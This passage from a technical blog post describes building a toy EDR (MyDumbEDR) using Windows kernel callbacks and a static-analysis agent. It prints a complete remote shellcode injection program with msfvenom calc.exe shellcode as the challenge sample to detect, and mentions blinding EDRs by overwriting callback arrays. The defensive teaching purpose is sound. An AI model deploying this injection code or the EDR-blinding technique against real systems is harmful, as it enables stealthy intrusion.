</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The logic is pretty dumb, if the image filename of the process being created is mimikatz, then the EDR blocks the creation of the process:</p>
<video class="video-shortcode" preload="" controls="">
    <source src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/kernelcallbacks.mp4" type="video/mp4">
    There should have been a video here but your browser does not seem
    to support it.
</video>




<p>As you can see, notepad.exe is allowed while mimikatz.exe is denied, perfect!</p>
<p>Now to go a little deeper in the kernel callback mechanism, we may ask ourself how the kernel is able to know if a driver registered a kernel callback? Well for each function callback we mentionned before, there is an array in the kernel memory that stores pointers to EDR’s routine:</p>
<table>
<thead>
<tr>
<th>Function callback</th>
<th>Corresponding array name</th>
<th>Max number of callbacks that can be registered</th>
</tr>
</thead>
<tbody>
<tr>
<td>PsSetCreateProcessNotifyRoutine</td>
<td>Ps<strong>p</strong>CreateProcessNotifyRoutine</td>
<td>64</td>
</tr>
<tr>
<td>PsSetCreateThreadNotifyRoutine</td>
<td>Ps<strong>p</strong>CreateThreadNotifyRoutine</td>
<td>64</td>
</tr>
<tr>
<td>PsSetLoadImageNotifyRoutine</td>
<td>Ps<strong>p</strong>LoadImageNotifyRoutine</td>
<td>8</td>
</tr>
<tr>
<td>CmRegisterCallback</td>
<td>Cm<strong>p</strong>CallBackVector</td>
<td>100</td>
</tr>
</tbody>
</table>
<p>Using WinDBG.exe we can check the actual content of these arrays. For example on the following screenshot we can see that the PspCreateProcessNotifyRoutine contains 9 hexadecimal addresses, hence 9 kernel callbacks:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/pspcreateprocessnotifyroutine.png" alt="Content of the PspCreateProcessNotifyRoutine structure"></p>
<p>Therefore, each time a process is launched, the kernel will read the PspCreateProcessNotifyRoutine array and for each of the 9 pointers, it will send a notification about the process being created. As an attacker these arrays are specifically interesting because if you can overwrite them or remove the pointers, you will basically be able to blind the EDR and thus prevent it from monitoring the system (and there is already a pretty cool tool that will allow you doing that, <a href="https://github.com/br-sn/CheekyBlinder">CheekyBlinder</a>).</p>
<p>At this point our driver is able to monitore for process creation and deny it if the image filename is mimikatz. Obvioulsy this logic is not enough because if you rename mimikatz.exe to notmimikatz.exe, you will bypass the check. Thus we will have to develop a more complex detection routine.</p>
<h1 id="vii-from-theorical-kernel-callbacks-to-a-fully-working-edr">VII/ From theorical kernel callbacks to a fully working EDR</h1>
<p>Being aware of a process being created on the system is interesting but if we don’t treat the information, it’s useless. As a security product developer we need to implement some sort of logic that will allow us determine if this process is legitimate or not. For security and stability reasons (mostly because developping in kernel space is a nightmare) every EDR relies on a user space agent that is orchestrating the entire EDR solution. This agent is at least doing two things:</p>
<ul>
<li>It analyzes binaries being launced on the system statically</li>
<li>It injects a custom DLL into the process in order to monitor API calls</li>
</ul>
<p>So basically a more realistic, yet simplistic, schema of how a EDR works would be the following:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/drivertoagent.png" alt="EDR’s driver communicating with the user space agent"></p>
<p>The kernel driver receives notifications about specific actions being executed on the system via the kernel callbacks mechanism, then it forwards this to the agent in which most of the detection logic is developed.</p>
<p>So we are going to have to develop a custom user space agent that is going to be the one analyzing the system. But before going further let’s settle what are our expectactions for our EDR. At this point the only thing I wanted the MyDumbEDR to be able to detect is binaries that attempt to inject shellcode into remote process using such code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">"stdio.h"</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;TlHelp32.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_process_id_from_szexefile</span>(<span style="color:#66d9ef">wchar_t</span> processName[]) {
</span></span><span style="display:flex;"><span>	PROCESSENTRY32 entry <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>	entry.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
</span></span><span style="display:flex;"><span>	HANDLE snapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (Process32First(snapshot, <span style="color:#f92672">&amp;</span>entry) <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span> (Process32Next(snapshot, <span style="color:#f92672">&amp;</span>entry) <span style="color:#f92672">==</span> TRUE) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (wcscmp(entry.szExeFile, processName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> entry.th32ProcessID;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">"CreateToolhelper32Snapshot failed : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"Process not found.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_if_se_debug_privilege_is_enabled</span>() {
</span></span><span style="display:flex;"><span>	HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
</span></span><span style="display:flex;"><span>	HANDLE hToken;
</span></span><span style="display:flex;"><span>	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES <span style="color:#f92672">|</span> TOKEN_QUERY, <span style="color:#f92672">&amp;</span>hToken);
</span></span><span style="display:flex;"><span>	DWORD cbSize;
</span></span><span style="display:flex;"><span>	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>cbSize);
</span></span><span style="display:flex;"><span>	PTOKEN_MANDATORY_LABEL pTIL <span style="color:#f92672">=</span> (PTOKEN_MANDATORY_LABEL)LocalAlloc(<span style="color:#ae81ff">0</span>, cbSize);
</span></span><span style="display:flex;"><span>	GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, <span style="color:#f92672">&amp;</span>cbSize);
</span></span><span style="display:flex;"><span>	DWORD current_process_integrity <span style="color:#f92672">=</span> (DWORD)<span style="color:#f92672">*</span>GetSidSubAuthority(pTIL<span style="color:#f92672">-&gt;</span>Label.Sid, (DWORD)(UCHAR)(<span style="color:#f92672">*</span>GetSidSubAuthorityCount(pTIL<span style="color:#f92672">-&gt;</span>Label.Sid) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	TOKEN_PRIVILEGES tp;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	LUID luidSeDebugPrivilege;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, <span style="color:#f92672">&amp;</span>luidSeDebugPrivilege) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">"SeDebugPrivilege not owned</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">"SeDebugPrivilege owned</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	tp.PrivilegeCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	tp.Privileges[<span style="color:#ae81ff">0</span>].Luid <span style="color:#f92672">=</span> luidSeDebugPrivilege;
</span></span><span style="display:flex;"><span>	tp.Privileges[<span style="color:#ae81ff">0</span>].Attributes <span style="color:#f92672">=</span> SE_PRIVILEGE_ENABLED;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (AdjustTokenPrivileges(hToken, FALSE, <span style="color:#f92672">&amp;</span>tp, <span style="color:#66d9ef">sizeof</span>(TOKEN_PRIVILEGES), NULL, NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">"SeDebugPrivilege adjust token failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, GetLastError());
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">"SeDebugPrivilege enabled.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	CloseHandle(hProcess);
</span></span><span style="display:flex;"><span>	CloseHandle(hToken);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"Launching remote shellcode injection</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// DO NOT REMOVE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// When loading a DLL remotely, its content won't apply until all DLL's are loaded
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// For some reason it leads to a race condition which is not part of the challenge
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	Sleep(<span style="color:#ae81ff">5000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// DO NOT REMOVE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	check_if_se_debug_privilege_is_enabled();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">wchar_t</span> processName[] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">"notepad.exe"</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> processId <span style="color:#f92672">=</span> get_process_id_from_szexefile(processName);
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"Injecting to PID: %i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, processId);
</span></span><span style="display:flex;"><span>	HANDLE processHandle <span style="color:#f92672">=</span> OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// msfvenom -p windows/x64/exec CMD=calc.exe -b "\x00\x0a\0d" -f c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x48\x31\xc9\x48\x81\xe9\xdb\xff\xff\xff\x48\x8d\x05\xef\xff</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xff\xff\x48\xbb\x33\xef\x18\x46\xf8\x06\x62\xef\x48\x31\x58</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xcf\xa7\x9b\xa2\x08\xee</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xa2\xef\x33\xef\x59\x17\xb9\x56\x30\xbe\x65\xa7\x29\x94\x9d</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x4e\xe9\xbd\x53\xa7\x93\x14\xe0\x4e\xe9\xbd\x13\xa7\x93\x34</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xa8\x4e\x6d\x58\x79\xa5\x55\x77\x31\x4e\x53\x2f\x9f\xd3\x79</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x3a\xfa\x2a\x42\xae\xf2\x26\x15\x07\xf9\xc7\x80\x02\x61\xae</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x49\x0e\x73\x54\x42\x64\x71\xd3\x50\x47\x28\x8d\xe2\x67\x33</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xef\x18\x0e\x7d\xc6\x16\x88\x7b\xee\xc8\x16\x73\x4e\x7a\xab</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xb8\xaf\x38\x0f\xf9\xd6\x81\xb9\x7b\x10\xd1\x07\x73\x32\xea</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xa7\x32\x39\x55\x77\x31\x4e\x53\x2f\x9f\xae\xd9\x8f\xf5\x47</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x63\x2e\x0b\x0f\x6d\xb7\xb4\x05\x2e\xcb\x3b\xaa\x21\x97\x8d</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\xde\x3a\xab\xb8\xaf\x3c\x0f\xf9\xd6\x04\xae\xb8\xe3\x50\x02</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x73\x46\x7e\xa6\x32\x3f\x59\xcd\xfc\x8e\x2a\xee\xe3\xae\x40</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x07\xa0\x58\x3b\xb5\x72\xb7\x59\x1f\xb9\x5c\x2a\x6c\xdf\xcf</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x59\x14\x07\xe6\x3a\xae\x6a\xb5\x50\xcd\xea\xef\x35\x10\xcc</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x10\x45\x0e\x42\x07\x62\xef\x33\xef\x18\x46\xf8\x4e\xef\x62</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x32\xee\x18\x46\xb9\xbc\x53\x64\x5c\x68\xe7\x93\x43\xf6\xd7</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x4d\x65\xae\xa2\xe0\x6d\xbb\xff\x10\xe6\xa7\x9b\x82\xd0\x3a</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x64\x93\x39\x6f\xe3\xa6\x8d\x03\xd9\xa8\x20\x9d\x77\x2c\xf8</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x5f\x23\x66\xe9\x10\xcd\x05\xc2\x5a\x35\x86\x5d\x8b\x77\x31</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x8b\x5a\x31\x96\x40\x9b\x7d\x2b\xcb\x34\x3e\x8c\x52\x83\x7b</span><span style="color:#e6db74">"</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">"</span><span style="color:#ae81ff">\x68\x9d\x7e\x07\xef</span><span style="color:#e6db74">"</span>;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">"VirtualAllocEx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	PVOID remoteBuffer <span style="color:#f92672">=</span> VirtualAllocEx(processHandle, NULL, <span style="color:#66d9ef">sizeof</span>(shellcode), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"WriteProcessMemory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode), NULL);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"CreateRemoteThread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	HANDLE remoteThread <span style="color:#f92672">=</span> CreateRemoteThread(processHandle, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">"Expect more checks in the upcoming weeks ;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>	CloseHandle(processHandle);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>There are quite a few markers that can be used to flag this binary as malicious. First, it uses multiple functions in an order that is suspicious: OpenProcess &gt; VirtualAllocEx &gt; WriteProcessMemory &gt; CreateRemoteThread. Then, the binary is allocating RWX (read, write, execute) memory which is suspicious. Finally it contains suspicious strings as well as flagged msfvenom shellcode.</p>
<p>For our EDR, I decided to create two agents instead of one. Both these agents will receive a few information from the driver via a named pipe which is an <a href="https://blog.whiteflag.io/blog/weaponizing-windows-rpc-interfaces/"><strong>I</strong>nternal <strong>P</strong>rocess <strong>C</strong>ommunication</a>.</p>
<p>Thus, the MyDumbEDR relies on 3 components:</p>
<ul>
<li>The kernel driver which will receive notifications about processes being created</li>
<li>The StaticAnalyzer agent which will analyze statically the binary</li>
<li>The RemoteInjector agent which will inject a custom DLL in each process being created</li>
</ul>
<p>Schematically:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/mydumbedrflow.png" alt="MyDumbEDR workflow"></p>
<p>Let’s take a closer look at what both the agents do.</p>
<h2 id="1-the-static-analyzer">1/ The static analyzer</h2>
<p>The static analyzer receives the path of the image filename of the processes being launched. It will then heck statically for three things:</p>
<ul>
<li>If the binary is signed</li>
<li>If the OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread functions are listed in the IAT (<strong>I</strong>mport <strong>A</strong>ddress <strong>T</strong>able)</li>
<li>If the string SeDebugPrivilege is present in the binary</li>
</ul>
<p>Below is the code of the agent:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dbghelp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wintrust.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Softpub.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wincrypt.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment (lib, "wintrust.lib")
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, "dbghelp.lib")
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, "crypt32.lib")
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MESSAGE_SIZE 2048
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">VerifyEmbeddedSignature</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> binaryPath) {
</span></span><span style="display:flex;"><span>    LONG lStatus;
</span></span><span style="display:flex;"><span>    WINTRUST_FILE_INFO FileData;
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>FileData, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(FileData));
</span></span><span style="display:flex;"><span>    FileData.cbStruct <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(WINTRUST_FILE_INFO);
</span></span><span style="display:flex;"><span>    FileData.pcwszFilePath <span style="color:#f92672">=</span> binaryPath;
</span></span><span style="display:flex;"><span>    FileData.hFile <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    FileData.pgKnownSubject <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    GUID WVTPolicyGUID <span style="color:#f92672">=</span> WINTRUST_ACTION_GENERIC_VERIFY_V2;
</span></span><span style="display:flex;"><span>    WINTRUST_DATA WinTrustData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Initializing necessary structures
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    memset(<span style="color:#f92672">&amp;</span>WinTrustData, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(WinTrustData));
</span></span><span style="display:flex;"><span>    WinTrustData.cbStruct <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(WinTrustData);
</span></span><span style="display:flex;"><span>    WinTrustData.pPolicyCallbackData <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    WinTrustData.pSIPClientData <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    WinTrustData.dwUIChoice <span style="color:#f92672">=</span> WTD_UI_NONE;
</span></span><span style="display:flex;"><span>    WinTrustData.fdwRevocationChecks <span style="color:#f92672">=</span> WTD_REVOKE_NONE;
</span></span><span style="display:flex;"><span>    WinTrustData.dwUnionChoice <span style="color:#f92672">=</span> WTD_CHOICE_FILE;
</span></span><span style="display:flex;"><span>    WinTrustData.dwStateAction <span style="color:#f92672">=</span> WTD_STATEACTION_VERIFY;
</span></span><span style="display:flex;"><span>    WinTrustData.hWVTStateData <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    WinTrustData.pwszURLReference <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    WinTrustData.dwUIContext <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    WinTrustData.pFile <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>FileData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lStatus <span style="color:#f92672">=</span> WinVerifyTrust(NULL, <span style="color:#f92672">&amp;</span>WVTPolicyGUID, <span style="color:#f92672">&amp;</span>WinTrustData);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    BOOL isSigned;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (lStatus) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The file is signed and the signature was verified
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> ERROR_SUCCESS:
</span></span><span style="display:flex;"><span>        isSigned <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// File is signed but the signature is not verified or is not trusted
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> TRUST_E_SUBJECT_FORM_UNKNOWN <span style="color:#f92672">||</span> TRUST_E_PROVIDER_UNKNOWN <span style="color:#f92672">||</span> TRUST_E_EXPLICIT_DISTRUST <span style="color:#f92672">||</span> CRYPT_E_SECURITY_SETTINGS <span style="color:#f92672">||</span> TRUST_E_SUBJECT_NOT_TRUSTED:
</span></span><span style="display:flex;"><span>        isSigned <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// The file is not signed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">case</span> TRUST_E_NOSIGNATURE:
</span></span><span style="display:flex;"><span>        isSigned <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Shouldn't happen but hey may be!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        isSigned <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Any hWVTStateData must be released by a call with close.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    WinTrustData.dwStateAction <span style="color:#f92672">=</span> WTD_STATEACTION_CLOSE;
</span></span><span style="display:flex;"><span>    WinVerifyTrust(NULL, <span style="color:#f92672">&amp;</span>WVTPolicyGUID, <span style="color:#f92672">&amp;</span>WinTrustData);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> isSigned;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ListImportedFunctions</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> binaryPath) {
</span></span><span style="display:flex;"><span>    BOOL isOpenProcessPresent <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>    BOOL isVirtualAllocExPresent <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>    BOOL isWriteProcessMemoryPresent <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>    BOOL isCreateRemoteThreadPresent <span style="color:#f92672">=</span> FALSE;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Load the target binary so that we can parse its content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HMODULE hModule <span style="color:#f92672">=</span> LoadLibraryEx(binaryPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hModule <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get NT headers from the binary
